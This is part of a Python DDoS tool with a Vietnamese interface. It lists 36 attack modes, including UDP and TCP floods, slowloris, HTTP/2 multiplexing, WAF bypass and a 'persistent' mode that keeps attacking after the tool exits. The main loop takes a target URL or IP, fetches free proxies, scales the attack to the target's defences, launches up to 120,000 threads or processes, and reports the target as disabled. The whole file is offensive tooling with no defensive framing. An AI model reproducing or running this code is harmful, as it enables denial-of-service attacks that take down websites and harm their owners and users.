    {"id": "27", "name": "persistent", "threads": 120000, "requests": 5000, "desc": "Tấn công liên tục", "level": "Tối đa", "application": "Tấn công không ngừng"},
    {"id": "28", "name": "http2", "threads": 4000, "requests": 1500, "desc": "Tấn công HTTP/2", "level": "Cao", "application": "Máy chủ HTTP/2"},
    {"id": "29", "name": "keep_alive", "threads": 4000, "requests": 1500, "desc": "Tấn công keep-alive", "level": "Cao", "application": "Máy chủ HTTP"},
    {"id": "30", "name": "multi_proc", "threads": 8000, "requests": 2500, "desc": "Tấn công đa tiến trình", "level": "Cao", "application": "Tấn công hiệu suất"},
    {"id": "31", "name": "multi_async", "threads": 8000, "requests": 2500, "desc": "Tấn công đa tiến trình + async", "level": "Cao", "application": "Tấn công bất đồng bộ"},
    {"id": "32", "name": "udp_flood", "threads": 8000, "requests": 4000, "desc": "Tấn công UDP tầng 4", "level": "Cao", "application": "Tấn công mạng"},
    {"id": "33", "name": "waf_bypass", "threads": 10000, "requests": 3500, "desc": "Tấn công vượt WAF", "level": "Cao", "application": "Bypass tường lửa web"},
    {"id": "34", "name": "tcp_udp", "threads": 10000, "requests": 4000, "desc": "Tấn công TCP/UDP", "level": "Cao", "application": "Tấn công mạng trực tiếp"},
    {"id": "35", "name": "ultimate_x", "threads": 12000, "requests": 4000, "desc": "Tấn công đa tầng", "level": "Rất Cao", "application": "Mục tiêu đa tầng"},
    {"id": "36", "name": "vuln_scan", "threads": 1, "requests": 1, "desc": "Quét lỗ hổng web nâng cao", "level": "Thấp", "application": "Kiểm tra bảo mật toàn diện"}
]

# Display ordered functions
def display_ordered_functions():
    clear_screen()
    display_banner()
    table = Table(title="36 CHIẾN LƯỢC TẤN CÔNG & QUÉT LỖ HỔNG (SẮP XẾP THEO CƯỜNG ĐỘ)", style="info")
    table.add_column("ID", style="highlight")
    table.add_column("Tên", style="success")
    table.add_column("Mô tả")
    table.add_column("Luồng", justify="right")
    table.add_column("Yêu cầu", justify="right")
    table.add_column("Tổng lượt", justify="right")
    table.add_column("Cấp độ")
    table.add_column("Ứng dụng")
    sorted_configs = sorted(TARGET_CONFIGS, key=lambda x: x['threads'] * x['requests'])
    for func in sorted_configs:
        table.add_row(
            func['id'],
            func['name'].upper(),
            func['desc'],
            f"{func['threads']:,}",
            f"{func['requests']:,}",
            f"{func['threads'] * func['requests']:,}",
            func['level'],
            func['application']
        )
    console.print(table)
    Prompt.ask("[info]Nhấn Enter để trở về menu...[/]")

# Display target menu
def display_target_menu():
    clear_screen()
    display_banner()
    table = Table(title="MENU CHIẾN LƯỢC TẤN CÔNG & QUÉT LỖ HỔNG", style="info")
    table.add_column("ID", style="highlight")
    table.add_column("Tên", style="success")
    table.add_column("Mô tả")
    table.add_row("0", "Danh sách", "Xem danh sách chiến lược")
    for target in sorted(TARGET_CONFIGS, key=lambda x: int(x['id'])):
        table.add_row(target['id'], target['name'].upper(), target['desc'])
    console.print(table)

# Display sub-menu for Ultimate-X attack
def display_ultimate_x_menu():
    clear_screen()
    display_banner()
    table = Table(title="CHỌN LOẠI TẤN CÔNG ULTIMATE-X", style="info")
    table.add_column("ID", style="highlight")
    table.add_column("Loại Tấn Công")
    table.add_row("1", "Băng thông (UDP/ICMP Flood)")
    table.add_row("2", "Giao thức (TCP SYN/ACK/RST)")
    table.add_row("3", "Tầng ứng dụng (HTTP + WAF Bypass)")
    console.print(table)

# Main function
def main():
    check_file_integrity()
    multiprocessing.set_start_method('spawn')
    
    # Fetch proxies at startup
    loop = asyncio.get_event_loop()
    loop.run_until_complete(fetch_free_proxies())
    
    while True:
        try:
            display_target_menu()
            choice = Prompt.ask("[info]Nhập lựa chọn (0-36)[/]")

            if choice == "0":
                display_ordered_functions()
                continue

            target = next((t for t in TARGET_CONFIGS if t['id'] == choice), None)
            if not target:
                console.print("[error][LỖI] Lựa chọn không hợp lệ! Thử lại.[/]")
                logging.error(f"Invalid choice: {choice}")
                time.sleep(1)
                continue
            target_selection_effect(target['name'])

            input_url = Prompt.ask("[info]Nhập URL hoặc IP mục tiêu[/]")
            if not input_url:
                console.print("[error][LỖI] URL/IP không được để trống! Thử lại.[/]")
                logging.error("Empty URL/IP input")
                time.sleep(1)
                continue

            try:
                validated_url = validate_url(input_url)
                host = urllib.parse.urlparse(validated_url).hostname
                port = urllib.parse.urlparse(validated_url).port or 80
            except ValueError:
                host = input_url
                port = 80
                validated_url = f"http://{host}"
                console.print(f"[warning][HỆ THỐNG] Xử lý mục tiêu như IP: {host}[/]")
                logging.warning(f"Processing target as IP: {host}")

            console.print(f"[success][HỆ THỐNG] Mục tiêu đã khóa: {validated_url}[/]")
            logging.info(f"Target locked: {validated_url}")

            if target['name'] == "vuln_scan":
                console.print("[info][HỆ THỐNG] Bắt đầu quét lỗ hổng web nâng cao...[/]")
                loading_animation("Quét lỗ hổng web", 3)
                loop = asyncio.get_event_loop()
                vulnerabilities = loop.run_until_complete(scan_vulnerabilities(validated_url))
                display_vulnerability_report(vulnerabilities)
                continue

            base_threads = target['threads']
            base_requests = target['requests']

            if target['name'] == "persistent":
                console.print("[error][CẢNH BÁO] Tấn công sẽ chạy nền kể cả sau khi thoát![/]")
                console.print("[warning]Để dừng: Dùng 'killall python3' (Linux/Termux) hoặc Task Manager (Windows)[/]")
                logging.warning("Persistent attack warning issued")

            if target['name'] == "ultimate_x":
                display_ultimate_x_menu()
                attack_choice = Prompt.ask("[info]Chọn loại tấn công (1-3)[/]")
                if attack_choice not in ["1", "2", "3"]:
                    console.print("[error][LỖI] Lựa chọn không hợp lệ! Thử lại.[/]")
                    logging.error(f"Invalid ultimate_x attack choice: {attack_choice}")
                    time.sleep(1)
                    continue

            if target['name'] not in ("infinite", "unlimited", "overload", "blitz", "combined", "persistent", "layer3_4", "multi_vector", "layer7", "http2", "keep_alive", "multi_proc", "multi_async", "udp_flood", "waf_bypass", "tcp_udp", "ultimate_x", "vuln_scan"):
                confirm = Confirm.ask("[error][HỆ THỐNG] Xác nhận tấn công[/]")
                if not confirm:
                    console.print("[warning][HỆ THỐNG] Hủy tấn công[/]")
                    logging.warning("Attack cancelled by user")
                    continue

            console.print("[info][HỆ THỐNG] Đang đánh giá mức độ bảo mật của mục tiêu...[/]")
            loading_animation("Đánh giá bảo mật", 2)
            security_level, recommended_threads, recommended_requests = assess_target_security(validated_url)

            if security_level == "THẤP":
                NUM_THREADS = min(recommended_threads, base_threads // 2)
                REQUESTS_PER_THREAD = min(recommended_requests, base_requests // 2)
                attack_strategy = "TẤN CÔNG NHẸ"
            elif security_level == "TRUNG BÌNH":
                NUM_THREADS = base_threads
                REQUESTS_PER_THREAD = base_requests
                attack_strategy = "LỰC LƯỢNG VỪA PHẢI"
            else:
                NUM_THREADS = max(recommended_threads, base_threads)
                REQUESTS_PER_THREAD = max(recommended_requests, base_requests)
                attack_strategy = "LỰC LƯỢNG TỐI ĐA"

            # Cap threads and requests to avoid overloading 16GB RAM system
            max_threads = min(NUM_THREADS, 120000)  # Adjusted for 16GB RAM
            max_requests = min(REQUESTS_PER_THREAD, 5000)
            max_processes = min(multiprocessing.cpu_count() * 4, 16)  # Leverage multi-core CPU

            panel = Panel(
                f"""
[+] CHIẾN LƯỢC TẤN CÔNG: {target['name'].upper()}
[+] Mục tiêu: {validated_url}
[+] Luồng: {max_threads:,}
[+] Yêu cầu/Luồng: {max_requests:,}
[+] Chiến lược: {attack_strategy}
[+] Tổng lượt đánh: {max_threads * max_requests:,}
                """,
                title="THÔNG TIN TẤN CÔNG",
                style="info"
            )
            console.print(panel)
            console.print("[error][HỆ THỐNG] Khởi động tấn công...[/]")
            logging.info(f"Starting attack: {target['name']}, Target: {validated_url}, Threads: {max_threads}, Requests: {max_requests}")
            loading_animation("Khởi động hệ thống tấn công", 3)

            start_time = time.time()

            if target['name'] == "persistent":
                save_attack_config(validated_url, max_threads, max_requests, target['name'])
                processes = []
                for _ in range(max_processes):
                    p = multiprocessing.Process(target=persistent_attack_process, args=(validated_url, max_requests))
                    p.daemon = True
                    processes.append(p)
                    p.start()
                console.print(f"[error][HỆ THỐNG] Tấn công liên tục bắt đầu với {len(processes)} tiến trình! Dùng 'killall python3' hoặc Task Manager để dừng.[/]")
                logging.info(f"Persistent attack started with {len(processes)} processes")
                time.sleep(2)
                exit(0)
            elif target['name'] == "unlimited":
                unlimited_thread = threading.Thread(target=unlimited_threads_attack, args=(validated_url,))
                unlimited_thread.start()
                try:
                    unlimited_thread.join()
                except KeyboardInterrupt:
                    console.print("[warning][HỆ THỐNG] Tấn công vô hạn bị dừng bởi người dùng[/]")
                    logging.warning("Unlimited attack stopped by user")
                    exit(0)
            elif target['name'] == "overload":
                threads = []
                for _ in range(max_threads):
                    t = threading.Thread(target=overload_429_403_attack, args=(validated_url, max_requests))
                    threads.append(t)
                    t.start()
                try:
                    for t in threads:
                        t.join()
                except KeyboardInterrupt:
                    console.print("[warning][HỆ THỐNG] Tấn công quá tải 429/403 bị dừng bởi người dùng[/]")
                    logging.warning("Overload attack stopped by user")
                    exit(0)
            elif target['name'] == "blitz":
                threads = []
                for _ in range(max_threads):
                    t = threading.Thread(target=blitz_522_attack, args=(validated_url, max_requests))
                    threads.append(t)
                    t.start()
                try:
                    for t in threads:
                        t.join()
                except KeyboardInterrupt:
                    console.print("[warning][HỆ THỐNG] Tấn công chớp nhoáng 522 bị dừng bởi người dùng[/]")
                    logging.warning("Blitz attack stopped by user")
                    exit(0)
            elif target['name'] == "combined":
                threads = []
                for _ in range(max_threads):
                    t = threading.Thread(target=combined_all_attack, args=(validated_url, max_requests))
                    threads.append(t)
                    t.start()
                try:
                    for t in threads:
                        t.join()
                except KeyboardInterrupt:
                    console.print("[warning][HỆ THỐNG] Tấn công kết hợp bị dừng bởi người dùng[/]")
                    logging.warning("Combined attack stopped by user")
                    exit(0)
            elif target['name'] == "layer3_4":
                threads = []
                for _ in range(max_threads):
                    t = threading.Thread(target=layer3_4_attack, args=(host, port, max_requests))
                    threads.append(t)
                    t.start()
                try:
                    for t in threads:
                        t.join()
                except KeyboardInterrupt:
                    console.print("[warning][HỆ THỐNG] Tấn công tầng 3/4 bị dừng bởi người dùng[/]")
                    logging.warning("Layer 3/4 attack stopped by user")
                    exit(0)
            elif target['name'] == "multi_vector":
                threads = []
                for _ in range(max_threads):
                    t = threading.Thread(target=multi_vector_attack, args=(validated_url, max_requests))
                    threads.append(t)
                    t.start()
                try:
                    for t in threads:
                        t.join()
                except KeyboardInterrupt:
                    console.print("[warning][HỆ THỐNG] Tấn công đa vector bị dừng bởi người dùng[/]")
                    logging.warning("Multi-vector attack stopped by user")
                    exit(0)
            elif target['name'] == "layer7":
                threads = []
                for _ in range(max_threads):
                    t = threading.Thread(target=layer7_waf_bypass_attack, args=(validated_url, max_requests))
                    threads.append(t)
                    t.start()
                try:
                    for t in threads:
                        t.join()
                except KeyboardInterrupt:
                    console.print("[warning][HỆ THỐNG] Tấn công tầng 7 bị dừng bởi người dùng[/]")
                    logging.warning("Layer 7 attack stopped by user")
                    exit(0)
            elif target['name'] == "http2":
                if not HTTP2_AVAILABLE:
                    console.print("[error][LỖI] Tấn công HTTP/2 bị vô hiệu hóa: Chưa cài đặt module 'h2'[/]")
                    logging.error("HTTP/2 attack disabled: 'h2' module not installed")
                    time.sleep(1)
                    continue
                threads = []
                for _ in range(max_threads):
                    t = threading.Thread(target=http2_multiplexing_attack, args=(validated_url,))
                    threads.append(t)
                    t.start()
                try:
                    for t in threads:
                        t.join()
                except KeyboardInterrupt:
                    console.print("[warning][HỆ THỐNG] Tấn công HTTP/2 bị dừng bởi người dùng[/]")
                    logging.warning("HTTP/2 attack stopped by user")
                    exit(0)
            elif target['name'] == "keep_alive":
                threads = []
                for _ in range(max_threads):
                    t = threading.Thread(target=keep_alive_pipelining_attack, args=(validated_url,))
                    threads.append(t)
                    t.start()
                try:
                    for t in threads:
                        t.join()
                except KeyboardInterrupt:
                    console.print("[warning][HỆ THỐNG] Tấn công keep-alive bị dừng bởi người dùng[/]")
                    logging.warning("Keep-alive attack stopped by user")
                    exit(0)
            elif target['name'] == "multi_proc":
                processes = []
                for _ in range(max_processes):
                    p = multiprocessing.Process(target=multiprocessing_attack, args=(validated_url, max_requests))
                    p.daemon = True
                    processes.append(p)
                    p.start()
                try:
                    for p in processes:
                        p.join()
                except KeyboardInterrupt:
                    console.print("[warning][HỆ THỐNG] Tấn công đa tiến trình bị dừng bởi người dùng[/]")
                    logging.warning("Multiprocessing attack stopped by user")
                    exit(0)
            elif target['name'] == "multi_async":
                processes = []
                for _ in range(max_processes):
                    p = multiprocessing.Process(target=multiprocessing_async_wrapper, args=(validated_url, max_requests))
                    p.daemon = True
                    processes.append(p)
                    p.start()
                try:
                    for p in processes:
                        p.join()
                except KeyboardInterrupt:
                    console.print("[warning][HỆ THỐNG] Tấn công đa tiến trình + bất đồng bộ bị dừng bởi người dùng[/]")
                    logging.warning("Multiprocessing async attack stopped by user")
                    exit(0)
            elif target['name'] == "udp_flood":
                threads = []
                for _ in range(max_threads):
                    t = threading.Thread(target=udp_flood_attack, args=(host, port))
                    threads.append(t)
                    t.start()
                try:
                    for t in threads:
                        t.join()
                except KeyboardInterrupt:
                    console.print("[warning][HỆ THỐNG] Tấn công UDP flood bị dừng bởi người dùng[/]")
                    logging.warning("UDP flood attack stopped by user")
                    exit(0)
            elif target['name'] == "waf_bypass":
                threads = []
                for _ in range(max_threads):
                    t = threading.Thread(target=layer7_waf_bypass_attack, args=(validated_url,))
                    threads.append(t)
                    t.start()
                try:
                    for t in threads:
                        t.join()
                except KeyboardInterrupt:
                    console.print("[warning][HỆ THỐNG] Tấn công vượt WAF bị dừng bởi người dùng[/]")
                    logging.warning("WAF bypass attack stopped by user")
                    exit(0)
            elif target['name'] == "tcp_udp":
                threads = []
                for _ in range(max_threads):
                    t = threading.Thread(target=layer4_tcp_udp_flood, args=(host, port))
                    threads.append(t)
                    t.start()
                try:
                    for t in threads:
                        t.join()
                except KeyboardInterrupt:
                    console.print("[warning][HỆ THỐNG] Tấn công TCP/UDP bị dừng bởi người dùng[/]")
                    logging.warning("TCP/UDP attack stopped by user")
                    exit(0)
            elif target['name'] == "ultimate_x":
                if attack_choice == "1":
                    threads = []
                    for _ in range(max_threads):
                        t = threading.Thread(target=udp_flood_attack, args=(host, port))
                        threads.append(t)
                        t.start()
                    try:
                        for t in threads:
                            t.join()
                    except KeyboardInterrupt:
                        console.print("[warning][HỆ THỐNG] Tấn công băng thông bị dừng bởi người dùng[/]")
                        logging.warning("Bandwidth attack stopped by user")
                        exit(0)
                elif attack_choice == "2":
                    threads = []
                    for _ in range(max_threads):
                        t = threading.Thread(target=layer4_tcp_udp_flood, args=(host, port))
                        threads.append(t)
                        t.start()
                    try:
                        for t in threads:
                            t.join()
                    except KeyboardInterrupt:
                        console.print("[warning][HỆ THỐNG] Tấn công giao thức bị dừng bởi người dùng[/]")
                        logging.warning("Protocol attack stopped by user")
                        exit(0)
                else:
                    threads = []
                    for _ in range(max_threads):
                        t = threading.Thread(target=layer7_waf_bypass_attack, args=(validated_url,))
                        threads.append(t)
                        t.start()
                    try:
                        for t in threads:
                            t.join()
                    except KeyboardInterrupt:
                        console.print("[warning][HỆ THỐNG] Tấn công tầng ứng dụng bị dừng bởi người dùng[/]")
                        logging.warning("Application layer attack stopped by user")
                        exit(0)
            else:
                while True:
                    slowloris_thread = threading.Thread(target=slowloris_attack, args=(validated_url, 30))
                    flood_thread = threading.Thread(target=http_flood_attack, args=(validated_url, max_threads * 2))
                    slowloris_thread.start()
                    flood_thread.start()

                    threads = []
                    for _ in range(max_threads):
                        t = threading.Thread(target=send_request, args=(validated_url, max_requests))
                        threads.append(t)
                        t.start()

                    for t in threads:
                        t.join()

                    slowloris_thread.join()
                    flood_thread.join()

                    console.print("[warning][HỆ THỐNG] Chu kỳ tấn công vô hạn: Tiếp tục...[/]")
                    logging.info("Infinite attack cycle continuing")
                    time.sleep(1)

            end_time = time.time()
            total_time = end_time - start_time

            with manager:
                if response_times:
                    avg_response_time = sum(response_times) / len(response_times)
                    max_response_time = max(response_times)
                    min_response_time = min(response_times)
                else:
                    avg_response_time = 0
                    max_response_time = 0
                    min_response_time = 0

            report = Panel(
                f"""
[+] BÁO CÁO CHIẾN DỊCH: {target['name'].upper()}
[+] Tổng lượt đánh: {(max_threads * max_requests):,}
[+] Thành công: {success_count:,} ({success_count/(max_threads * max_requests)*100:.1f}%)
[+] Thất bại: {error_count:,} ({error_count/(max_threads * max_requests)*100:.1f}%)
[+] Tổng thời gian: {total_time:.2f} giây
[+] Thời gian phản hồi trung bình: {avg_response_time:.2f}ms
[+] Hiệu suất đỉnh: {max_response_time:.2f}ms
[+] Độ trễ tối thiểu: {min_response_time:.2f}ms
[+] Lượt đánh/giây: {(max_threads * max_requests)/total_time:.0f}
[+] MỤC TIÊU BỊ VÔ HIỆU HÓA!
                """,
                title="BÁO CÁO TẤN CÔNG",
                style="success"
            )
            console.print(report)
            logging.info(f"Attack report: Total requests: {max_threads * max_requests}, Success: {success_count}, Failed: {error_count}, Time: {total_time:.2f}s")

        except KeyboardInterrupt:
            console.print("[warning][HỆ THỐNG] Tấn công bị dừng bởi người dùng[/]")
            logging.warning("Attack stopped by user")
            exit(0)
        except Exception as e:
            console.print(f"[error][HỆ THỐNG] Lỗi nghiêm trọng: {str(e)}[/]")
            logging.error(f"Critical error: {str(e)}")
            exit(1)

if __name__ == "__main__":
    main()